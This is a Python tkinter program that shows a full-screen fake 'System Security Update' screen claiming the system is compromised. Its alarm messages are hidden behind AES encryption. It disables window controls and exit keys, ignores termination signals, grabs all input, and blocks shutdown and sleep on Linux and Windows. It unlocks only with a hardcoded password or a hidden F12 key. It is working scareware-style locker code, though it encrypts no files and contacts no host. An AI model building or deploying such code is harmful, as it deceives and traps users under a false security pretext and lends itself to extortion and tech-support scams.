import tkinter as tk
import random
import base64
import threading
import time
import os
import hashlib
import subprocess
from tkinter import PhotoImage
from datetime import datetime
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

import signal
# PIL removed as requested
# AES Encryption logic (consolidated from cryptography.py)
def pad(text_bytes):
    """PKCS7 padding"""
    pad_len = 16 - (len(text_bytes) % 16)
    return bytes(text_bytes) + bytes([pad_len]) * pad_len

def unpad(text_bytes):
    """Remove PKCS7 padding"""
    pad_len = text_bytes[-1]
    return text_bytes[:-pad_len]

def encrypt_aes(plain_text, key):
    """Encrypt using AES-CBC"""
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(plain_text.encode('utf-8')))
    return base64.b64encode(iv + encrypted).decode('utf-8')

def decrypt_aes(encrypted_text, key):
    """Decrypt AES-CBC"""
    try:
        encrypted_data = base64.b64decode(encrypted_text)
        if len(encrypted_data) < 16:
            return None
        iv = encrypted_data[:16]
        encrypted_message = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_bytes = cipher.decrypt(encrypted_message)
        return unpad(decrypted_bytes).decode('utf-8')
    except Exception:
        return None

# Global key for consistency (derived from a password)
DEF_PASSWORD = "Ngawang"
PATCH_KEY = hashlib.sha256(DEF_PASSWORD.encode()).digest()

def encode_message(message: str) -> str:
    """Encode message using AES."""
    return encrypt_aes(message, PATCH_KEY)

def decode_message(encoded: str) -> str:
    """Decode AES obfuscated message."""
    try:
        dec = decrypt_aes(encoded, PATCH_KEY)
        return dec if dec is not None else encoded
    except Exception:
        # Fallback if decode fails (maybe it was old XOR data?)
        return encoded

# AES-encoded messages (updated to use password: "Ngawang")
_MESSAGE_DATA = "IQAGouMsK0sOlHVo+dUepqUGKR4cL6DhM2VUpF97vAbmW8zdRj7JurYawaQf9ZyE9cxViyzVXhhYx9fOHktLdA=="
_WARNING_TITLE = "gJxpnSRkhdsvQ3vCY8WJZFY0iE4XzL+dXWmpgHiyCkNfurg5EHc1uZOYT7Vg2tYz"
_STATUS_SYSTEM = "TmUq/KZUWAw+DNhhloU3tQlyynqueQcIIbJh18wnLWaGlmysm4U+5ROheUCbWVM0"
_STATUS_CRITICAL = "29zUCmr2lextOWU9gFT45vANej491sQIvCdAN6NLTEVVtoqP4MzO1tzB3JHwdANt"
_WARNING_TEXT = "lHljXI1kdx93fE2X94RIRU4zrtueAVYfWDgH8qM8BFfJamr6+xzA2HKVDceGjlNk"
_SKULL_DATA = "ILlUSNUVA1nss+5pHmgOUw/e48Haxy8HF6iq+Fajds7iwWXgWz3zAQfQGoYUpobsgDlG/I/EvQ5/gIcvNeOBLa2PgidK8vmlFDG/qIX5fLxTBuZm4TFU8WEVnERlhGLeHDEQw2olHoBUXMS9AOCeOPYPO/V9F3poFs4bliFgJ3wfdP9j9qk4+emp0af1wG41GrDX4y4VUH064GL+I2P/G5y/psFt/khiXO5bnr68iNMdTh0Mrr8HGs3u587D4y2T/YIYjqG8NpMSEQSnCrIk5A=="


# For testing - generate new encoded messages
def generate_encoded_messages():
    """Generate encoded versions of messages for the code."""
    messages = {
        "MESSAGE_DATA": "SYSTEM COMPROMISED... CONTACT ADMINISTRATOR",
        "WARNING_TITLE": "SYSTEM SECURITY UPDATE",
        "STATUS_SYSTEM": "System: COMPROMISED",
        "STATUS_CRITICAL": "Status: CRITICAL",
        "WARNING_TEXT": "DO NOT RESTART OR SHUT DOWN"
    }
    
    print(f"Using Password: {DEF_PASSWORD}")
    for name, msg in messages.items():
        encoded = encode_message(msg)
        print(f"{name} = \"{encoded}\"")


# Color scheme
COLOR_BG = "#0a0a0a"
COLOR_PRIMARY = "#00ff00"
COLOR_WARNING = "#ff3333"
COLOR_INFO = "#00ccff"
COLOR_SUCCESS = "#00ff00"
COLOR_DIM = "#004400"


class TypeWriterEffect:
    """Enhanced typewriter effect with variable speed and cursor."""
    
    def __init__(self, label, text, callback=None):
        self.label = label
        self.text = text
        self.index = 0
        self.callback = callback
        self.running = True
        
    def start(self):
        """Start the typewriter effect."""
        self._type()
        
    def _type(self):
        """Type one character at a time with variable speed."""
        if self.index < len(self.text) and self.running:
            current_text = self.text[:self.index + 1]
            cursor = "█" if self.index % 2 == 0 else " "
            self.label.config(text=cursor + current_text)
            
            # Variable speed for more realistic effect
            if self.text[self.index] in ['.', '!', '?']:
                delay = random.randint(200, 400)
            elif self.text[self.index] in [',', ';', ':']:
                delay = random.randint(150, 250)
            else:
                delay = random.randint(30, 100)
                
            self.index += 1
            self.label.after(delay, self._type)
        elif self.callback:
            self.callback()


class PatchUpdateGUI:
    """Main GUI class for the fake patch update screen."""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("System Update")
        self.start_time = datetime.now()
        self.setup_window()
        self.create_widgets()
        self.setup_recovery_bindings()
        self.inhibit_process = None
        self.block_restart()
        self.start_animations()
        
    def setup_window(self):
        """Configure window properties."""
        # Set fullscreen
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(background=COLOR_BG, cursor="none")
        
        # Disable close button and window controls
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Bind keys (prevent easy exit)
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Control-c>", lambda e: "break")
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Control-Alt-Delete>", lambda e: "break") # Note: OS often intercepts this
        
        # Secret key (F12) for emergency exit (for developer use)
        self.root.bind("<F12>", lambda e: self.root.destroy())
        
    def create_widgets(self):
        """Create all GUI widgets."""
        # Main container frame
        self.main_frame = tk.Frame(self.root, bg=COLOR_BG)
        self.main_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        # Header with system icon and title
        header_frame = tk.Frame(self.main_frame, bg=COLOR_BG)
        header_frame.pack(pady=(0, 30))
        
        # Warning icon
        self.warning_label = tk.Label(
            header_frame,
            text="⚠",
            font=("Courier", 48, "bold"),
            fg=COLOR_WARNING,
            bg=COLOR_BG
        )
        self.warning_label.pack(side="left", padx=(0, 20))
        
        # ASCII Skull integration (encrypted string Decrypted at runtime)
        try:
            skull_ascii = decode_message(_SKULL_DATA)
            self.skull_display = tk.Label(
                self.main_frame,
                text=skull_ascii,
                font=("Courier", 10, "bold"),
                fg=COLOR_PRIMARY,
                bg=COLOR_BG,
                pady=10
            )
            self.skull_display.pack()
        except Exception as e:
            # Fallback for old systems
            print(f"Decryption error: {e}")
            self.warning_label = tk.Label(
                self.main_frame,
                text="[!] SYSTEM ERROR: UNRECOGNIZED SIGNATURE [!]",
                font=("Courier", 12, "bold"),
                fg=COLOR_WARNING,
                bg=COLOR_BG
            )
            self.warning_label.pack(pady=10)
        
        # Title - decode from encoded data
        title_text = decode_message(_WARNING_TITLE)
        title_label = tk.Label(
            header_frame,
            text=title_text,
            font=("Courier", 36, "bold"),
            fg=COLOR_WARNING,
            bg=COLOR_BG
        )
        title_label.pack(side="left")
        
        # Status message with typewriter effect
        self.status_label = tk.Label(
            self.main_frame,
            text="",
            font=("Courier", 24, "bold"),
            fg=COLOR_PRIMARY,
            bg=COLOR_BG,
            justify="center",
            wraplength=900
        )
        self.status_label.pack(pady=20)
        
        # Progress bar frame
        self.progress_frame = tk.Frame(self.main_frame, bg=COLOR_BG)
        self.progress_frame.pack(pady=30, fill="x", padx=50)
        
        # Progress bar background
        self.progress_bg = tk.Frame(
            self.progress_frame,
            bg=COLOR_DIM,
            height=30
        )
        self.progress_bg.pack(fill="x")
        self.progress_bg.pack_propagate(False)
        
        # Progress bar fill
        self.progress_fill = tk.Frame(
            self.progress_bg,
            bg=COLOR_PRIMARY,
            height=30
        )
        self.progress_fill.pack(side="left", fill="y")
        self.progress_fill.pack_propagate(False)
        
        # Progress percentage label
        self.progress_label = tk.Label(
            self.progress_frame,
            text="0%",
            font=("Courier", 14, "bold"),
            fg=COLOR_PRIMARY,
            bg=COLOR_BG
        )
        self.progress_label.pack(pady=(10, 0))
        
        # Info panel
        info_frame = tk.Frame(self.main_frame, bg=COLOR_BG)
        info_frame.pack(pady=20)
        
        # System info labels - decode from encoded data
        system_text = decode_message(_STATUS_SYSTEM)
        self.create_info_label(info_frame, system_text, COLOR_WARNING)
        
        self.time_label = tk.Label(
            info_frame,
            text=f"Time: {self.start_time.strftime('%H:%M:%S')}",
            font=("Courier", 14),
            fg=COLOR_INFO,
            bg=COLOR_BG
        )
        self.time_label.pack(pady=5)
        
        critical_text = decode_message(_STATUS_CRITICAL)
        self.create_info_label(info_frame, critical_text, COLOR_WARNING)
        
        # Blinking warning text
        blink_text = decode_message(_WARNING_TEXT)
        self.blink_label = tk.Label(
            self.main_frame,
            text=blink_text,
            font=("Courier", 18, "bold"),
            fg=COLOR_WARNING,
            bg=COLOR_BG
        )
        self.blink_label.pack(pady=10)
        
        # Recovery entry section
        self.recovery_frame = tk.Frame(self.main_frame, bg=COLOR_BG)
        self.recovery_frame.pack(pady=20) # Showing by default as requested
        
        tk.Label(
            self.recovery_frame,
            text="ADMIN RECOVERY PORTAL (Ctrl+P to Toggle):",
            font=("Courier", 14, "bold"),
            fg=COLOR_INFO,
            bg=COLOR_BG
        ).pack(pady=(0, 10))
        
        self.pass_entry = tk.Entry(
            self.recovery_frame,
            show="*",
            font=("Courier", 16),
            bg=COLOR_DIM,
            fg=COLOR_PRIMARY,
            insertbackground=COLOR_PRIMARY,
            relief="flat",
            width=20,
            justify="center"
        )
        self.pass_entry.pack(pady=10)
        self.pass_entry.bind("<Return>", self.verify_recovery)
        
        self.res_label = tk.Label(
            self.recovery_frame,
            text="ENTER ENCRYPTION KEY",
            font=("Courier", 10),
            fg=COLOR_DIM,
            bg=COLOR_BG
        )
        self.res_label.pack(pady=5)
        
    def create_info_label(self, parent, text, color):
        """Create an info label with consistent styling."""
        label = tk.Label(
            parent,
            text=text,
            font=("Courier", 14),
            fg=color,
            bg=COLOR_BG
        )
        label.pack(pady=5)
        
    def start_animations(self):
        """Start all animation effects."""
        # Start typewriter effect - decode main message
        main_message = decode_message(_MESSAGE_DATA)
        self.type_writer = TypeWriterEffect(self.status_label, main_message)
        self.type_writer.start()
        
        # Start progress bar animation
        self.progress_value = 0
        self.animate_progress()
        
        # Start blinking effect
        self.blink_state = True
        self.animate_blink()
        
        # Start time update
        self.update_time()
        
    def animate_progress(self):
        """Animate the progress bar."""
        if self.progress_value < 100:
            increment = random.randint(1, 5)
            self.progress_value = min(100, self.progress_value + increment)
            self.progress_fill.config(width=self.progress_value * 6)
            self.progress_label.config(text=f"{self.progress_value}%")
            delay = random.randint(50, 200)
            self.root.after(delay, self.animate_progress)
        else:
            self.progress_label.config(text="100% - COMPLETE", fg=COLOR_SUCCESS)
            self.root.after(2000, self.trigger_fake_restart_failure)
            
    def trigger_fake_restart_failure(self):
        """Show a fake restart failure message."""
        self.status_label.config(text="ATTEMPTING SYSTEM RESTART...", fg=COLOR_INFO)
        self.root.after(3000, lambda: self.status_label.config(
            text="CRITICAL ERROR: RESTART INHIBITED BY SYSTEM SECURITY POLICY", 
            fg=COLOR_WARNING
        ))
        self.root.after(6000, lambda: self.status_label.config(
            text="PLEASE CONTACT YOUR ADMINISTRATOR IMMEDIATELY", 
            fg=COLOR_WARNING
        ))
            
    def animate_blink(self):
        """Blink the warning text."""
        if self.blink_state:
            self.blink_label.config(fg=COLOR_BG)
        else:
            self.blink_label.config(fg=COLOR_WARNING)
        self.blink_state = not self.blink_state
        self.root.after(500, self.animate_blink)
        
    def update_time(self):
        """Update the time display."""
        elapsed = datetime.now() - self.start_time
        minutes = int(elapsed.total_seconds() // 60)
        seconds = int(elapsed.total_seconds() % 60)
        time_str = f"{minutes:02d}:{seconds:02d}"
        self.time_label.config(text=f"Time: {time_str}")
        self.root.after(1000, self.update_time)
        
    def keep_focus(self):
        """Keep window in focus and entry focused if it's visible."""
        try:
            self.root.lift()
            self.root.attributes("-topmost", True)
            
            # Maintain focus on password entry if recovery panel is visible
            if hasattr(self, 'recovery_frame') and self.recovery_frame.winfo_viewable():
                if self.root.focus_get() != self.pass_entry:
                    self.pass_entry.focus_set()
            else:
                self.root.focus_force()

            # Grab all input events
            try:
                self.root.grab_set_global()
            except Exception:
                try:
                    self.root.grab_set()
                except Exception:
                    pass
        except Exception:
            pass
        self.root.after(100, self.keep_focus)
        
    def run(self):
        """Start the application."""
        # Ignore common exit signals to prevent bypass via terminal
        try:
            signal.signal(signal.SIGINT, signal.SIG_IGN)
            signal.signal(signal.SIGTERM, signal.SIG_IGN)
        except Exception:
            pass

        # Start focus maintenance
        self.root.after(100, self.keep_focus)
        self.root.mainloop()
        
        # Clean up inhibition on exit
        if self.inhibit_process:
            self.inhibit_process.terminate()
            
        if os.name == 'nt':
            try:
                import ctypes
                # Restore power management and release shutdown block
                ctypes.windll.user32.ShutdownBlockReasonDestroy(self.root.winfo_id())
                ctypes.windll.kernel32.SetThreadExecutionState(0x80000000)
            except Exception:
                pass

    def block_restart(self):
        """Inhibit system shutdown/reboot on Linux and Windows."""
        if os.name != 'nt': # Linux
            try:
                # Use systemd-inhibit to block shutdown, sleep, and power button handling
                self.inhibit_process = subprocess.Popen([
                    "systemd-inhibit",
                    "--what=shutdown:sleep:idle:handle-power-key:handle-suspend-key:handle-hibernate-key:handle-lid-switch",
                    "--why=System Security Patch Updating - CRITICAL - DO NOT INTERRUPT",
                    "--mode=block",
                    "sleep", "infinity"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass
        else: # Windows
            try:
                import ctypes
                # Prevent sleep, display off and system idle
                # 0x80000000 = ES_CONTINUOUS
                # 0x00000001 = ES_SYSTEM_REQUIRED
                # 0x00000002 = ES_DISPLAY_REQUIRED
                ctypes.windll.kernel32.SetThreadExecutionState(0x80000001 | 0x80000002)
                
                # Block shutdown with a custom reason (Win32 API)
                hwnd = self.root.winfo_id()
                reason = "A critical system update is being applied. Shutdown is disabled to prevent data corruption."
                ctypes.windll.user32.ShutdownBlockReasonCreate(hwnd, ctypes.c_wchar_p(reason))
            except Exception:
                pass

    def setup_recovery_bindings(self):
        """Set up keys to toggle the recovery panel."""
        # CTRL+P to toggle the recovery panel
        self.root.bind("<Control-p>", self.show_recovery_panel)
        self.root.bind("<Control-P>", self.show_recovery_panel)

    def show_recovery_panel(self, event=None):
        """Toggle the password input section."""
        if self.recovery_frame.winfo_viewable():
            self.recovery_frame.pack_forget()
        else:
            self.recovery_frame.pack(pady=20)
            self.pass_entry.delete(0, tk.END)
            self.pass_entry.focus_set()
            self.res_label.config(text="ENTER ENCRYPTION KEY", fg=COLOR_DIM)

    def verify_recovery(self, event=None):
        """Verify the password and exit if correct."""
        pwd = self.pass_entry.get()
        if pwd == DEF_PASSWORD:
            self.status_label.config(text="SYSTEM AUTHENTICATED... RECOVERY AUTHORIZED.", fg=COLOR_SUCCESS)
            self.recovery_frame.pack_forget()
            self.root.after(2000, self.root.destroy)
        else:
            self.res_label.config(text="[!] AUTHENTICATION FAILURE [!]", fg=COLOR_WARNING)
            self.pass_entry.delete(0, tk.END)
            # Subtle shake effect if desired, but error message is enough


def main():
    """Main entry point."""
    try:
        app = PatchUpdateGUI()
        app.run()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    main()